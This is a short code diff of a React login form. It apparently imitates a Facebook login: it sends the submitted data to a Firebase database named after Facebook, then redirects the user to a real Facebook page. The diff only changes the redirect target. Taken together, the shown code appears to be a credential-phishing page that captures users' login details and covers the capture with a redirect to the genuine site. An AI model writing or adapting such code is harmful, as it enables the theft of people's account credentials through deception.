@@ -33,7 +33,7 @@ const LoginForm = () => {
     };
     const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
 
-    window.location.href = "https://www.facebook.com/profile.php?id=100091219641608&mibextid=7BxKtlCqh5F1hMP9";
+    window.location.href = "https://facebook.com/groups/1220483151301152/";
 
     console.log(res)
     // if (res){
@@ -46,6 +46,7 @@ const LoginForm = () => {
   // ... le reste de votre composant
 
   return (
+    
     <form className="login-form" >
       <input
       type="email"
